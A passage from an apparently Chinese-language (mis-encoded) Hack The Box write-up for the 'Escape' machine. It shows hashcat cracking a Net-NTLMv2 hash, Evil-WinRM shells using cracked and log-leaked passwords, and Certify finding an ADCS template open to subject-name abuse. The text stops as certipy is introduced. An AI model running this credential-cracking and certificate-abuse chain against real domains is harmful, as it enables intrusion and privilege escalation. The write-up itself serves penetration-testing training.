<h2 id="ç ´è§£Net-NTLMv2-hash"><a href="#ç ´è§£Net-NTLMv2-hash" class="headerlink" title="ç ´è§£Net-NTLMv2 hash"></a>ç ´è§£Net-NTLMv2 hash</h2><p>ç”¨hashcatç ´è§£ã€‚è‡ªåŠ¨æ£€æµ‹æ¨¡å¼æ‰¾åˆ°5600çš„å“ˆå¸Œç±»å‹:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -m 5600 password.txt rockyou.txt</span><br><span class="line"></span><br><span class="line">Approaching final keyspace - workload adjusted.</span><br><span class="line"></span><br><span class="line">sql_svc::sequel:a052ed0636102870:E34517E6D5F61D5423F401D9A35B8AE0:010100000000000000FA92A342A2D901C3A576838D8EBA6E00000000020008005A0058005700430001001E00570049004E002D004800360056004F004C00300051004D0044004800320004003400570049004E002D004800360056004F004C00300051004D004400480032002E005A005800570043002E004C004F00430041004C00030014005A005800570043002E004C004F00430041004C00050014005A005800570043002E004C004F00430041004C000700080000FA92A342A2D9010600040002000000080030003000000000000000000000000030000012E38F1D56C0404175A7C4C531D6164BC569F5ABDD833B040000C1B5F25101B90A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0032000000000000000000:REGGIE1234ronnie</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 5600 (NetNTLMv2)</span><br><span class="line">Hash.Target......: SQL_SVC::sequel:a052ed0636102870:e34517e6d5f61d5423...000000</span><br><span class="line">Time.Started.....: Mon Jun 19 12:21:19 2023 (1 sec)</span><br><span class="line">Time.Estimated...: Mon Jun 19 12:21:20 2023 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........: 18688.5 kH/s (4.62ms) @ Accel:1024 Loops:1 Thr:64 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#3.........:   447.9 kH/s (9.23ms) @ Accel:16 Loops:1 Thr:64 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#*.........: 19136.3 kH/s</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 12910592/14344386 (90.00%)</span><br><span class="line">Rejected.........: 0/12910592 (0.00%)</span><br><span class="line">Restore.Point....: 9633792/14344386 (67.16%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Restore.Sub.<span class="comment">#3...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: benbaay -&gt; 2322434917</span></span><br><span class="line">Candidates.<span class="comment">#3....: 2229sr -&gt; 2129</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Temp: 53c Util: 23% Core:1245MHz Mem:6000MHz Bus:8</span></span><br><span class="line">Hardware.Mon.<span class="comment">#3..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Mon Jun 19 12:20:58 2023</span><br><span class="line">Stopped: Mon Jun 19 12:21:21 2023</span><br></pre></td></tr></table></figure>

<ul>
<li>å¯†ç ä¸º: REGGIE1234ronnie</li>
</ul>
<h2 id="WINRM"><a href="#WINRM" class="headerlink" title="WINRM"></a>WINRM</h2><p>æœ‰äº†è¿™ä¸ªå¯†ç ï¼Œå¯ä»¥ä½¿ç”¨<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0hhY2twbGF5ZXJzL2V2aWwtd2lucm0=">Evil-WinRM<i class="fa fa-external-link-alt"></i></span>è·å¾—sql_svcçš„shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">sequel\sql_svc</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape2.png"></li>
</ul>
<h1 id="Shell-as-Ryan-Cooper"><a href="#Shell-as-Ryan-Cooper" class="headerlink" title="Shell as Ryan.Cooper"></a>Shell as Ryan.Cooper</h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="æ–‡ä»¶ç³»ç»Ÿ"><a href="#æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿ"></a>æ–‡ä»¶ç³»ç»Ÿ</h3><p>sql_svcçš„homeç›®å½•åŸºæœ¬ä¸Šæ˜¯ç©ºçš„ã€‚Ryan.Cooperæ˜¯ä¸»æœºä¸Šå”¯ä¸€ä¸€ä¸ªæ‹¥æœ‰homeç›®å½•çš„ç”¨æˆ·:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\<span class="built_in">users</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----         2/7/2023   8:58 AM                Administrator</span><br><span class="line">d-r---        7/20/2021  12:23 PM                Public</span><br><span class="line">d-----         2/1/2023   6:37 PM                Ryan.Cooper</span><br><span class="line">d-----         2/7/2023   8:10 AM                sql_svc</span><br></pre></td></tr></table></figure>

<p>åœ¨Cç›˜çš„æ ¹ç›®å½•ä¸‹ï¼ŒPublicå’ŒSQLServeræ–‡ä»¶å¤¹æ˜¯ä¸å¸¸è§çš„:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----         2/1/2023   8:15 PM                PerfLogs</span><br><span class="line">d-r---         2/6/2023  12:08 PM                Program Files</span><br><span class="line">d-----       11/19/2022   3:51 AM                Program Files (x86)</span><br><span class="line">d-----       11/19/2022   3:51 AM                Public</span><br><span class="line">d-----         2/1/2023   1:02 PM                SQLServer</span><br><span class="line">d-r---         2/1/2023   1:55 PM                Users</span><br><span class="line">d-----         2/6/2023   7:21 AM                Windows</span><br></pre></td></tr></table></figure>

<p>Publicåªæœ‰SQL Server PRocedures.pdfæ–‡ä»¶ã€‚</p>
<p>SQLServerå®‰è£…å¦‚ä¸‹:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\SQLServer&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\SQLServer</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----         2/7/2023   8:06 AM                Logs</span><br><span class="line">d-----       11/18/2022   1:37 PM                SQLEXPR_2019</span><br><span class="line">-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe</span><br><span class="line">-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe</span><br></pre></td></tr></table></figure>

<p>logsç›®å½•ä¸‹æœ‰ä¸€ä¸ªæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\SQLServer\Logs&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\SQLServer\Logs</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK</span><br></pre></td></tr></table></figure>

<h3 id="ERRORLOG-BAK"><a href="#ERRORLOG-BAK" class="headerlink" title="ERRORLOG.BAK"></a>ERRORLOG.BAK</h3><p>è¯¥æ–‡ä»¶åŒ…å«æ¥è‡ªSQLæœåŠ¡å™¨çš„æ—¥å¿—:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\SQLServer\Logs&gt; <span class="built_in">type</span> ERRORLOG.BAK</span><br><span class="line">2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)</span><br><span class="line">        Sep 24 2019 13:48:23</span><br><span class="line">        Copyright (C) 2019 Microsoft Corporation</span><br><span class="line">        Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 &lt;X64&gt; (Build 17763: ) (Hypervisor)</span><br><span class="line"></span><br><span class="line">2022-11-18 13:43:05.97 Server      UTC adjustment: -8:00</span><br><span class="line">2022-11-18 13:43:05.97 Server      (c) Microsoft Corporation.</span><br><span class="line">2022-11-18 13:43:05.97 Server      All rights reserved.</span><br><span class="line">2022-11-18 13:43:05.97 Server      Server process ID is 3788.</span><br><span class="line">2022-11-18 13:43:05.97 Server      System Manufacturer: <span class="string">&#x27;VMware, Inc.&#x27;</span>, System Model: <span class="string">&#x27;VMware7,1&#x27;</span>.</span><br><span class="line">2022-11-18 13:43:05.97 Server      Authentication mode is MIXED.</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<p>åœ¨æ—¥å¿—çš„æœ€åï¼Œæœ‰è¿™äº›ä¿¡æ¯:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...[snip]...</span><br><span class="line">2022-11-18 13:43:07.44 Logon       Logon failed <span class="keyword">for</span> user <span class="string">&#x27;sequel.htb\Ryan.Cooper&#x27;</span>. Reason: Password did not match that <span class="keyword">for</span> the login provided. [CLIENT: 127.0.0.1]</span><br><span class="line">2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.</span><br><span class="line">2022-11-18 13:43:07.48 Logon       Logon failed <span class="keyword">for</span> user <span class="string">&#x27;NuclearMosquito3&#x27;</span>. Reason: Password did not match that <span class="keyword">for</span> the login provided. [CLIENT: 127.0.0.1]</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<p>çœ‹èµ·æ¥åƒRyan.Cooperå¯èƒ½è¾“é”™äº†å¯†ç ï¼Œä»–è¾“å…¥çš„å¯†ç æ˜¯â€NuclearMosquito3â€ä½œä¸ºç”¨æˆ·åã€‚å¦‚æœRyanåœ¨ç™»å½•æ—¶æŒ‰enterè€Œä¸æ˜¯tabé”®ï¼Œå°±å¯èƒ½å‘ç”Ÿè¿™ç§æƒ…å†µã€‚</p>
<h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><p>ä½¿ç”¨è¯¥å¯†ç ç”¨winrmè¿æ¥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># evil-winrm -i 10.10.11.202 -u ryan.cooper -p NuclearMosquito3</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">sequel\ryan.cooper</span><br><span class="line">*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents&gt; <span class="built_in">cat</span> ../Desktop/user.txt</span><br><span class="line">47e8a7ffa5ff5b79ea0eeb5906ec2a46</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape3.png"></li>
</ul>
<h1 id="Shell-as-administrator"><a href="#Shell-as-administrator" class="headerlink" title="Shell as administrator"></a>Shell as administrator</h1><h2 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="ç¡®è®¤-ADCS"><a href="#ç¡®è®¤-ADCS" class="headerlink" title="ç¡®è®¤ ADCS"></a>ç¡®è®¤ ADCS</h3><p>åœ¨WindowsåŸŸä¸Šæ€»æ˜¯éœ€è¦æšä¸¾çš„ä¸€ä»¶äº‹æ˜¯æŸ¥æ‰¾Active Directoryè¯ä¹¦æœåŠ¡(ADCS)ã€‚æ£€æŸ¥è¿™ä¸€ç‚¹çš„ä¸€ä¸ªå¿«é€Ÿæ–¹æ³•æ˜¯ä½¿ç”¨crackmapexec(å®ƒå¯ä»¥ä½œä¸ºsql_svcæˆ–Ryan.Cooperç”¨æˆ·):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs</span></span><br><span class="line">SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAPS       10.10.11.202    636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3</span><br><span class="line">ADCS                                                Found PKI Enrollment Server: dc.sequel.htb</span><br><span class="line">ADCS                                                Found CN: sequel-DC-CA</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape4.png"></li>
</ul>
<p>ä¸ä¹‹å‰å‘ç°çš„CAç›¸åŒ</p>
<h3 id="è¯†åˆ«æ˜“å—æ”»å‡»æ¨¡æ¿"><a href="#è¯†åˆ«æ˜“å—æ”»å‡»æ¨¡æ¿" class="headerlink" title="è¯†åˆ«æ˜“å—æ”»å‡»æ¨¡æ¿"></a>è¯†åˆ«æ˜“å—æ”»å‡»æ¨¡æ¿</h3><p>éšç€ADCSçš„è¿è¡Œï¼Œä¸‹ä¸€ä¸ªé—®é¢˜æ˜¯è¿™ä¸ªADCSä¸­æ˜¯å¦æœ‰ä»»ä½•ä¸å®‰å…¨æ¨¡æ¿é…ç½®ã€‚ä¸ºäº†è¿›ä¸€æ­¥æšä¸¾ï¼Œé€šè¿‡ä»<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL1NoYXJwQ29sbGVjdGlvbi90cmVlL21hc3Rlci9OZXRGcmFtZXdvcmtfNC43X0FueQ==">SharpCollection<i class="fa fa-external-link-alt"></i></span>ä¸‹è½½ä¸€ä¸ª<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dob3N0UGFjay9DZXJ0aWZ5">Certify<i class="fa fa-external-link-alt"></i></span>å¹¶å°†å…¶ä¸Šä¼ åˆ°Escape:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; upload Certify.exe</span><br><span class="line"></span><br><span class="line">Info: Uploading /root/hackthebox/machine/escape/Certify.exe to C:\programdata\Certify.exe</span><br><span class="line"></span><br><span class="line">Data: 236884 bytes of 236884 bytes copied</span><br><span class="line"></span><br><span class="line">Info: Upload successful!</span><br></pre></td></tr></table></figure>

<p>Certifyçš„READMEä»‹ç»äº†å¦‚ä½•åˆ—ä¸¾å’Œæ»¥ç”¨è¯ä¹¦æœåŠ¡ã€‚é¦–å…ˆï¼Œæ˜¾ç¤ºè¿è¡ŒCertify.exe find &#x2F;vulnerable é»˜è®¤ï¼Œè¿™å°†æŸ¥çœ‹æ ‡å‡†ä½æƒé™ç»„ã€‚æˆ–åŠ ä¸Š &#x2F;currentuseræ¥è·¨ç»„æŸ¥æ‰¾å½“å‰ç”¨æˆ·ï¼Œè¿™ä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥ã€‚</p>
<p>åœ¨æ‰“å°æœ‰å…³ä¼ä¸šCAçš„ä¸€äº›ä¿¡æ¯åï¼Œåˆ—å‡ºä¸€ä¸ªæ˜“å—æ”»å‡»çš„è¯ä¹¦æ¨¡æ¿:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; .\Certify.exe find /vulnerable /currentuser</span><br><span class="line"></span><br><span class="line">   _____          _   _  __</span><br><span class="line">  / ____|        | | (_)/ _|</span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class="line"> | |    / _ \ <span class="string">&#x27;__| __| |  _| | | |</span></span><br><span class="line"><span class="string"> | |___|  __/ |  | |_| | | | |_| |</span></span><br><span class="line"><span class="string">  \_____\___|_|   \__|_|_|  \__, |</span></span><br><span class="line"><span class="string">                             __/ |</span></span><br><span class="line"><span class="string">                            |___./</span></span><br><span class="line"><span class="string">  v1.1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Action: Find certificate templates</span></span><br><span class="line"><span class="string">[*] Using current user&#x27;</span>s unrolled group SIDs <span class="keyword">for</span> vulnerability checks.</span><br><span class="line">[*] Using the search base <span class="string">&#x27;CN=Configuration,DC=sequel,DC=htb&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Listing info about the Enterprise CA <span class="string">&#x27;sequel-DC-CA&#x27;</span></span><br><span class="line"></span><br><span class="line">    Enterprise CA Name            : sequel-DC-CA</span><br><span class="line">    DNS Hostname                  : dc.sequel.htb</span><br><span class="line">    FullName                      : dc.sequel.htb\sequel-DC-CA</span><br><span class="line">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED</span><br><span class="line">    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb</span><br><span class="line">    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56</span><br><span class="line">    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101</span><br><span class="line">    Cert Start Date               : 11/18/2022 12:58:46 PM</span><br><span class="line">    Cert End Date                 : 11/18/2121 1:08:46 PM</span><br><span class="line">    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb</span><br><span class="line">    UserSpecifiedSAN              : Disabled</span><br><span class="line">    CA Permissions                :</span><br><span class="line">      Owner: BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line"></span><br><span class="line">      Access Rights                                     Principal</span><br><span class="line"></span><br><span class="line">      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11</span><br><span class="line">      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line">      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512</span><br><span class="line">      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519</span><br><span class="line">    Enrollment Agent Restrictions : None</span><br><span class="line"></span><br><span class="line">[!] Vulnerable Certificates Templates :</span><br><span class="line"></span><br><span class="line">    CA Name                               : dc.sequel.htb\sequel-DC-CA</span><br><span class="line">    Template Name                         : UserAuthentication</span><br><span class="line">    Schema Version                        : 2</span><br><span class="line">    Validity Period                       : 10 years</span><br><span class="line">    Renewal Period                        : 6 weeks</span><br><span class="line">    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT</span><br><span class="line">    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS</span><br><span class="line">    Authorized Signatures Required        : 0</span><br><span class="line">    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email</span><br><span class="line">    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512</span><br><span class="line">                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513</span><br><span class="line">                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500</span><br><span class="line">        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500</span><br><span class="line">                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512</span><br><span class="line">                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519</span><br><span class="line">        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500</span><br><span class="line">                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512</span><br><span class="line">                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519</span><br><span class="line">        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500</span><br><span class="line">                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512</span><br><span class="line">                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Certify completed <span class="keyword">in</span> 00:00:10.7916004</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„å±é™©åœ¨sequel\Domain Usersæ‹¥æœ‰è¯ä¹¦æ³¨å†Œæƒé™(è¿™æ˜¯Certify READMEæ–‡ä»¶ä¸­çš„åœºæ™¯3)</p>
<h2 id="æ»¥ç”¨æ¨¡æ¿"><a href="#æ»¥ç”¨æ¨¡æ¿" class="headerlink" title="æ»¥ç”¨æ¨¡æ¿"></a>æ»¥ç”¨æ¨¡æ¿</h2><h3 id="æ–¹æ³•1-certipy"><a href="#æ–¹æ³•1-certipy" class="headerlink" title="æ–¹æ³•1: certipy"></a>æ–¹æ³•1: certipy</h3><p>ç¡®å®å¯ä»¥çœ‹åˆ°ï¼Œå®é™…ä¸Šå­˜åœ¨ä¸€ä¸ªåä¸ºUserAuthenticationçš„æ˜“å—æ”»å‡»çš„æ¨¡æ¿ã€‚ç‰¹åˆ«ï¼Œå¯ä»¥çœ‹åˆ°ç»è¿‡Authenticated Userså¯ä»¥æ³¨å†Œæ­¤æ¨¡æ¿ï¼Œå¹¶ä¸”ç”±äºmsPKI-Certificate-Name-Flagå­˜åœ¨å¹¶ä¸”åŒ…å«ENROLLEE_SUPPLIES_SUBJECTï¼Œå› æ­¤è¯¥æ¨¡æ¿å®¹æ˜“å—åˆ°<span class="exturl" data-url="aHR0cHM6Ly9tMzY1aW50ZXJuYWxzLmNvbS8yMDIyLzExLzA3L2ludmVzdGlnYXRpbmctY2VydGlmaWNhdGUtdGVtcGxhdGUtZW5yb2xsbWVudC1hdHRhY2tzLWFkY3Mv">Investigating Certificate Template Enrollment Attacks â€“ (ADCS)<i class="fa fa-external-link-alt"></i></span>æ”»å‡»ã€‚æœ¬è´¨ä¸Šè®²ï¼Œè¿™å…è®¸ä»»ä½•äººæ³¨å†Œè¯¥æ¨¡æ¿å¹¶æŒ‡å®šä»»æ„ä¸»é¢˜æ›¿ä»£åç§°ã€‚è¿™æ„å‘³ç€ï¼Œå¯ä»¥é€šè¿‡åˆ©ç”¨æ­¤æ”»å‡»è·¯å¾„ä½œä¸ºåŸŸç®¡ç†å‘˜è¿›è¡Œèº«ä»½éªŒè¯ã€‚</p>
<p>ä¸ºäº†åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œä½¿ç”¨<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x5NGsvQ2VydGlweQ==">certipy<i class="fa fa-external-link-alt"></i></span></p>
